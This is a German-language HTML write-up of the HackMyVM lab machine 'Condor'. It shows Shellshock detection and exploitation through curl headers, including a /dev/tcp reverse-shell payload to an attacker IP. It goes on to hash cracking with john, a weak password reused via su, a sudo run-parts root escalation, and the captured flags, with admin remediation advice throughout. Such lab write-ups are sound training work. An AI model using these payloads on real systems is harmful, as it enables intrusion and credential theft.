@@ -1,0 +1,340 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Condor - HackMyVM - Level: Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Condor - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <!-- Die Farbe (Gelb/Orange) muss im CSS für diese Klasse definiert werden -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Die Klassen steuern die Farbe (Gelb/Orange) gemäß CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die Hintergrundfarbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">cp (implied)</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">Crackstation (external)</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">run-parts</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">pwd</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance & Vulnerability Identification</a></li>
+                <li><a href="#initial-access">Initial Access (via Shellshock)</a></li>
+                <li><a href="#privilege-escalation-apache-paulo">Privilege Escalation (apache -> paulo)</a></li>
+                <li><a href="#privilege-escalation-paulo-root">Privilege Escalation (paulo -> root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance & Vulnerability Identification</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der erste Schritt ist die Identifizierung potenzieller Schwachstellen. Da oft CGI-Skripte für Shellshock anfällig sind, wird Nmap direkt mit dem `http-shellshock`-Skript auf ein vermutetes CGI-Skript getestet.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt im Original -->
+                    <span class="command">nmap 192.168.2.128 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi</span>
+                    <!-- Keine Ausgabe im Original, aber der nächste Schritt impliziert einen Fund -->
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan (Ausgabe nicht gezeigt) hat vermutlich eine Shellshock-Anfälligkeit im Skript `/cgi-bin/admin.cgi` signalisiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Shellshock-Anfälligkeit manuell mit `curl` verifizieren.<br><strong>Empfehlung (Admin):</strong> CGI-Skripte und den Webserver auf Shellshock-Anfälligkeit prüfen und patchen. Alte CGI-Skripte meiden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt im Original -->
+                    <span class="command">curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://192.168.2.128/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'</span>
+                    <pre>
+VULNERABLE TO SHELLSHOCK
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt im Original -->
+                    <span class="command">curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://condor.vm/cgi-bin/admin.cgi</span>
+                    <!-- Keine Ausgabe, aber implizierte Verzögerung von 5 Sekunden -->
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Zwei `curl`-Befehle werden verwendet, um die Shellshock-Schwachstelle zu bestätigen:
+                <ol>
+                    <li>Der erste Befehl injiziert `echo "VULNERABLE..."` über den `User-Agent`-Header. Da die Ausgabe "VULNERABLE TO SHELLSHOCK" zurückkommt, ist die Anfälligkeit bestätigt.</li>
+                    <li>Der zweite Befehl injiziert `/bin/bash -c "sleep 5"`. Eine beobachtete Verzögerung von 5 Sekunden bei der Antwort bestätigt die Remote Code Execution (RCE).</li>
+                 </ol>
+                 Shellshock (CVE-2014-6271 und folgende) ist eine Schwachstelle in Bash, bei der speziell präparierte Umgebungsvariablen dazu führen können, dass nachfolgender Code ausgeführt wird, wenn die Variable von Bash geparst wird. CGI-Skripte setzen oft HTTP-Header (wie User-Agent oder Cookie) als Umgebungsvariablen, was sie zu einem häufigen Angriffspunkt macht.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritische RCE-Schwachstelle (Shellshock) in `/cgi-bin/admin.cgi` bestätigt. Dies ermöglicht die Ausführung beliebiger Befehle auf dem Server im Kontext des Webserver-Benutzers.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Schwachstelle ausnutzen, um eine Reverse Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> System dringend patchen (Bash aktualisieren) oder anfällige CGI-Skripte entfernen/ersetzen.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit Feroxbuster wird nach weiteren CGI-Skripten gesucht.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">feroxbuster -u http://condor.vm/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 200 -C 403 --no-recursion -x txt,php,[...],sh,py,cgi</span></div>
+                    <pre>
+[...]
+200      GET        7l       28w      286c http://condor.vm/cgi-bin/condor.sh
+[...]
+                    </pre> <!-- Gekürzte Ausgabe -->
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Feroxbuster findet ein weiteres Skript: `/cgi-bin/condor.sh`. Da das Ziel `condor.vm` heißt, ist dies möglicherweise ein relevanteres oder spezifischeres Skript.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein weiteres potenzielles Ziel für Shellshock oder andere Angriffe.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen, die Shellshock-Payload gegen `/cgi-bin/condor.sh` zu richten.<br><strong>Empfehlung (Admin):</strong> Alle CGI-Skripte überprüfen und absichern.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (via Shellshock)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, die Shellshock-Schwachstelle im neu gefundenen Skript `/cgi-bin/condor.sh` auszunutzen, um eine Reverse Shell zu erhalten. Diesmal wird die Payload über den `Cookie`-Header injiziert.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- IPs angepasst für Konsistenz: Angreifer 192.168.2.140 (aus Prompt), Ziel 192.168.2.128 -->
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/192.168.2.140/9001 0>&1' http://192.168.2.128/cgi-bin/condor.sh</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `curl`-Befehl sendet die Anfrage mit der injizierten Reverse-Shell-Payload. Ein Listener wird benötigt, um die Verbindung aufzufangen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Einen Netcat-Listener auf Port 9001 starten.<br><strong>Empfehlung (Admin):</strong> Shellshock patchen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.128] 45198</span>
+bash: cannot set terminal process group (429): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="password">bash-4.3$</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener empfängt erfolgreich die eingehende Verbindung vom Zielsystem. Der Prompt `bash-4.3$` deutet auf eine ältere Bash-Version hin und zeigt, dass die Shell nicht als Root läuft (vermutlich als Webserver-Benutzer wie `apache` oder `www-data`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Initialer Zugriff wurde über die Shellshock-Schwachstelle erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Shell stabilisieren (`python -c 'import pty...'` o.ä.), Benutzer identifizieren (`id`, `whoami`), Home-Verzeichnisse und Sudo-Rechte prüfen.<br><strong>Empfehlung (Admin):</strong> Shellshock patchen.</p>
+        </section>
+
+        <section id="privilege-escalation-apache-paulo">
+            <h2>Privilege Escalation (apache -> paulo)</h2>
+             <p class="analysis"><strong>Analyse:</strong> In der erhaltenen Shell (vermutlich als `apache` oder `www-data`) wird das System weiter erkundet.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">bash-4.3$ <span class="command">cd /home/kevin && ls -la</span></div>
+                    <pre>
+drwxr-xr-x 3 kevin kevin 4096 Nov  6  2021 .
+drwxr-xr-x 4 root  root  4096 Nov  6  2021 ..
+lrwxrwxrwx 1 root  root     9 Nov  6  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 kevin kevin  220 Nov  6  2021 .bash_logout
+-rw-r--r-- 1 kevin kevin 3526 Nov  6  2021 .bashrc
+<span class="command">-rw-r--r-- 1 kevin kevin 4060 Nov  6  2021 .i_did_it_again</span>
+drwxr-xr-x 3 kevin kevin 4096 Nov  6  2021 .local
+-rw-r--r-- 1 kevin kevin  807 Nov  6  2021 .profile
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Wechsel in das Verzeichnis `/home/kevin` und das Auflisten des Inhalts ist möglich. Eine interessante versteckte Datei `.i_did_it_again` wird gefunden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Webserver-Benutzer hat Leserechte auf `/home/kevin`. Die Datei `.i_did_it_again` ist verdächtig.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Inhalt von `.i_did_it_again` untersuchen.<br><strong>Empfehlung (Admin):</strong> Berechtigungen von Home-Verzeichnissen prüfen. Webserver-Benutzer sollten keinen Zugriff auf Home-Verzeichnisse anderer Benutzer haben.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">bash-4.3$ <span class="command">cat .i_did_it_again</span></div>
+                    <pre>
+<span class="command">8395d26f20d997f971919e93edee06d3</span>:<span class="password">$6$TCX.c/9ARPR3KCFE$4ZhsWox9dPa8/CG4O6socHVYYM6cJbtpaBx9cefvABC8gP0vMrWsgBhUUGoAHWnJI.X.NyzP5sbtMpGGfwuS11</span>
+<span class="command">307dcfe346e38992d47000630bd19579</span>:<span class="password">$6$gwBgUJgQHGxTex13$b/67Oe7CIvDS85hex4GrHC2RuEkLRfWHAAgimHNyxC/L5biEqSly920uazvDXx3ACrM.srme6Us78aWUEGNAG0</span>
+<span class="command">c34040783efce8ebedb253e854c79569</span>:<span class="password">$6$WAq1h/mdGSMb9QVv$aN54cSdOf3TEsGZt94op0s9hDGWwEusVLi8PtfMmzmOl3AMNGgBMJqQaRHxPrpSFJTLB2T.vFnbYKv6eQpzUT1</span>
+<span class="command">0edc0358ba098a665397f277d9caa307</span>:<span class="password">$6$n5AKhYSQNaywXCs0$k5X7gxoiRh/rfcUVxLHmFlhINTxnsJrqCPRCQYdKmn8UWtn2.yF8J.zqTrx3q8YdnDbdpzZvKNtK4ZqteGDEO.</span>
+<span class="command">dd41cb18c930753cbecf993f828603dc</span>:<span class="password">$6$1tKf9R.0qo7v5DjD$uYneSfO1bb4upW2xlLw.hHGeuAtCunYhdOjQS2MBdnpPcMt0ZiZee42BjDO2jmUJffTXsKdo43SjE4pqM6WqJ/</span> <!-- Dieser Hash wird geknackt -->
+[...] (viele weitere Hashes)
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt von `.i_did_it_again` zeigt eine Liste von Einträgen im Format `MD5-Hash:SHA512crypt-Hash`. Dies sieht stark nach einer benutzerdefinierten Passwortdatei aus, bei der der MD5-Hash möglicherweise den Benutzernamen repräsentiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Kritischer Fund!** Diese Datei enthält Passwort-Hashes ($6$ = SHA512crypt) für verschiedene Benutzer (repräsentiert durch MD5-Hashes). Diese können offline geknackt werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Inhalt dieser Datei auf die Angreifer-Maschine kopieren und die SHA512crypt-Hashes mit `john` oder `hashcat` knacken. Versuchen, die MD5-Hashes zu Benutzernamen zuzuordnen (z.B. durch Vergleich mit bekannten Benutzern oder Online-MD5-Datenbanken).<br><strong>Empfehlung (Admin):</strong> Sensible Daten wie Passwort-Hashes niemals in unverschlüsselten Dateien in Home-Verzeichnissen speichern. Berechtigungen strikt verwalten.</p>
+
+            <p class="analysis"><strong>Analyse (Hash Cracking):</strong> Die Hashes werden zur Angreifer-Maschine übertragen und in einer Datei `ppp` gespeichert. `john` wird mit der `rockyou.txt`-Wortliste verwendet.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Auf Angreifer-Maschine -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi ppp</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt ppp</span></div>
+                    <pre>
+Using default input encoding: UTF-8
+Loaded 29 password hashes with 29 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">password123</span>      (dd41cb18c930753cbecf993f828603dc) <!-- Passwort für den MD5-Hash dd41... gefunden -->
+[...]
+Use the "--show" option to display all of the cracked passwords reliably
+Session aborted
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> John the Ripper findet das Passwort `password123` für den Hash, der zum MD5-Hash `dd41cb18c930753cbecf993f828603dc` gehört.</p>
+            <p class="analysis"><strong>Analyse (Crackstation):</strong> Der MD5-Hash `dd41cb18c930753cbecf993f828603dc` wird auf Crackstation geprüft und als Benutzername `paulo` identifiziert.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Manuelle Notiz -->
+                    <pre>
+crack that hash on crackstation
+
+<span class="command">dd41cb18c930753cbecf993f828603dc</span> --> <span class="command">paulo</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Durch Kombination der Ergebnisse von John und Crackstation wurden die Anmeldedaten für den Benutzer `paulo` ermittelt: `paulo:password123`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sich als Benutzer `paulo` anmelden (z.B. mit `su` aus der aktuellen Shell).<br><strong>Empfehlung (Admin):</strong> Schwache Passwörter vermeiden. Keine benutzerdefinierten Passwortspeicher verwenden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">bash-4.3$ <span class="command">su paulo</span></div>
+                    <pre>
+Password: <span class="password">password123</span>
+<span class="password">paulo@condor:/home/kevin$</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Mit dem Befehl `su paulo` und dem Passwort `password123` wird erfolgreich zum Benutzer `paulo` gewechselt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Privilegieneskalation vom Webserver-Benutzer zu `paulo` erfolgreich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Umgebung als `paulo` untersuchen (`id`, `pwd`, `ls`, `sudo -l`), User-Flag holen.<br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen erforderlich.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">paulo@condor:~$ <span class="command">ls</span></div>
+                    <pre>
+user.txt
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">paulo@condor:~$ <span class="command">cat user.txt</span></div>
+                    <pre>
+<span class="password">5870c58caa86a64fccc0d1b7b7717d39</span>  -
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Im Home-Verzeichnis von `paulo` wird die `user.txt` gefunden und ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der User-Flag wurde erfolgreich extrahiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flag dokumentieren. Nach Wegen zur Root-Eskalation suchen (`sudo -l`).<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen bzgl. des Flags.</p>
+        </section>
+
+        <section id="privilege-escalation-paulo-root">
+            <h2>Privilege Escalation (paulo -> root)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">paulo@condor:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+User paulo may run the following commands on condor:
+    <span class="password">(ALL) NOPASSWD: /usr/bin/run-parts --new-session --regex '^sh$' /bin</span>
+                    </pre> <!-- Gekürzte Ausgabe -->
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `sudo -l` zeigt, dass `paulo` den Befehl `/usr/bin/run-parts` mit spezifischen Argumenten (`--new-session --regex '^sh$' /bin`) als jeder Benutzer (implizit `root`) ohne Passwort ausführen darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Kritischer Privilegieneskalationsvektor!** Diese `sudo`-Regel ist unsicher. `run-parts` führt Skripte aus einem Verzeichnis aus. Die Kombination der Argumente, insbesondere `--regex '^sh$'` angewendet auf `/bin`, führt dazu, dass `/bin/sh` selbst ausgeführt wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die `sudo`-Regel direkt ausführen, um eine Root-Shell zu erhalten. Diese Technik ist auf GTFOBins dokumentiert.<br><strong>Empfehlung (Admin):</strong> Diese `sudo`-Regel ist extrem unsicher und sollte sofort entfernt werden. `run-parts` sollte niemals auf diese Weise über `sudo` erlaubt werden.</p>
+
+            <p class="analysis"><strong>Proof of Concept: Privilege Escalation via sudo run-parts</strong><br>
+            Die folgende Sequenz demonstriert die Ausnutzung der unsicheren `sudo`-Regel für `run-parts`.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">paulo@condor:~$ <span class="command">sudo run-parts --new-session --regex '^sh$' /bin</span></div>
+                    <pre>
+/bin/sh: 0: can't access tty; job control turned off
+<span class="password">#</span> <span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
+#
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der `sudo`-Befehl wird ausgeführt. `run-parts` findet `/bin/sh` basierend auf der Regex `^sh$` im Verzeichnis `/bin` und führt es aus. Da der Befehl mit `sudo` läuft, wird `/bin/sh` als `root` gestartet. Der Prompt wechselt zu `#` und `id` bestätigt Root-Rechte.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Root-Zugriff wurde durch Ausnutzung der `sudo`-Regel erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Flag suchen.<br><strong>Empfehlung (Admin):</strong> Unsichere `sudo`-Regel entfernen.</p>
+        </section>
+
+        <section id="flags">
+            <h2>Flags</h2>
+
+            <div class="flag-container">
+                 <!-- User Flag Eintrag -->
+                <div class="flag-entry">
+                   <div class="flag-command">cat /home/paulo/user.txt</div>
+                   <div class="flag-value"><span class="password">5870c58caa86a64fccc0d1b7b7717d39</span></div>
+               </div>
+
+                <!-- Root Flag Eintrag -->
+                <div class="code-block">
+                    <div class="terminal">
+                        <div class="prompt"># <span class="command">pwd</span></div>
+                        <pre>/home/paulo</pre>
+                        <div class="prompt"># <span class="command">cd /root</span></div>
+                        <div class="prompt"># <span class="command">ls</span></div>
+                        <pre>root.txt</pre>
+                        <div class="prompt"># <span class="command">cat root.txt</span></div>
+                        <pre><span class="password">fec28c2738220437750c2c9537c706f3</span></pre>
+                     </div>
+                </div>
+                 <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">fec28c2738220437750c2c9537c706f3</span></div>
+               </div>
+           </div>
+            <p class="analysis"><strong>Analyse:</strong> In der Root-Shell wird nach `/root` gewechselt und die Datei `root.txt` ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Root-Flag wurde erfolgreich extrahiert. Der Penetrationstest ist abgeschlossen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen bzgl. des Flags.</p>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 6. November 2021</p>
+    </footer>
+</body>
+</html>
